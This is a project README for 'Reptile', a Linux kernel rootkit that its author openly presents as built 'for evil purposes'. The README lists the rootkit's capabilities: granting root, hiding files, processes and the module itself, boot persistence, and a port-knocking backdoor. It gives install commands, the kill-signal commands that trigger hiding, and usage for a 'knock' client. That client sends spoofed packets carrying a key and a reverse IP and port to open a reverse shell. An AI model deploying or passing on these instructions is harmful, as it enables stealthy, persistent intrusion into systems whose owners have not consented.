# Reptile

<img align="left" src="https://imgur.com/nqujOlz.png">

<br><br><br>Reptile is a LKM rootkit written for evil purposes that runs on kernel 2.6.x/3.x/4.x. Probably is the best that you will find public on the Internet.<br>

If you are searching stuff only for study purposes, see the [demonstration codes](https://github.com/f0rb1dd3n/papers/tree/master/rootkit_demonstration).<br><br><br>

## Features

- Give root to unprivileged users
- Hide files and directories
- Hide files contents
- Hide processes
- Hide himself
- Boot persistence
- Heaven's door - A ICMP/UDP/TCP port-knocking backdoor
- Client to knock on heaven's door :D
   
## Roadmap

- Socket/Packet hiding
- Port-knocking backdoor in kernel land
 
## Install
```
apt-get install linux-headers-$(uname -r)
git clone https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
./installer.sh install
```
## Uninstall
```
./install.sh remove
```

## Usage

Binaries will be copied to `/reptile` folder, that will be hidden by Reptile.

### Getting root privileges

<p align="center">
   <img src="https://imgur.com/bb3Bs5l.png">
</p>

### Hiding

- Hide/unhide reptile module: `kill -50 0`
- Hide/unhide process: `kill -49 <PID>`
- Hide files contents: `kill -51 0` and all content between the tags will be hidden

Example:
```
#<reptile> 
content to hide 
#</reptile>
```

### Knocking on heaven's door

Heaven's door is a ICMP/UDP/TCP port-knocking backdoor used by Reptile. To access the backdoor you can use the client: 
```
Knock Knock on Heaven's (Back)Door
Written by: F0rb1dd3n

Usage: ./knock <args>

-x      Protocol (ICMP/UDP/TCP)
-s      Source IP address (You can spoof)
-t      Target IP address
-p      Source Port
-q      Target Port
-d      Data to knock on backdoor: "<key> <reverse IP> <reverse Port>"
-l      Launch listener

[!] ICMP doesn't need ports

ICMP: ./knock -x icmp -s 192.168.0.2 -t 192.168.0.3 -d "F0rb1dd3n 192.168.0.4 4444" -l
UDP:  ./knock -x udp  -s 192.168.0.2 -t 192.168.0.3 -p 666 -q 53 -d "F0rb1dd3n 192.168.0.4 4444" -l
TCP:  ./knock -x tcp  -s 192.168.0.2 -t 192.168.0.3 -p 666 -q 80 -d "F0rb1dd3n 192.168.0.4 4444" -l

```
<p align="center">
   <img src="https://imgur.com/suuOUj2.png">
</p>

## Disclaimer

Some functions of this module is based on another rootkits. Please see the references!

## References

- “[LKM HACKING](http://www.ouah.org/LKM_HACKING.html)”, The Hackers Choice (THC), 1999;
- https://github.com/mncoppola/suterusu
- https://github.com/m0nad/Diamorphine.git
- https://github.com/David-Reguera-Garcia-Dreg/enyelkm.git
- https://github.com/maK-/maK_it-Linux-Rootkit
- “[Abuse of the Linux Kernel for Fun and Profit](http://phrack.org/issues/50/5.html)”, Halflife, Phrack 50, 1997;
- https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/

## Contributing

I am open to receiving contributions. If you can contribute with this project, discuss the contribution via e-mail or open an issue, fork the project and make a pull request. I will evaluate pull requests and merge to the project. 

I will consider writing new features with contribution to my BTC Wallet: `1ASRMARFrpSanLHXCdNHD7K7pvr1fbK2fb`

<p align="center">
   <img src="https://imgur.com/RdYgb1T.gif">
</p>
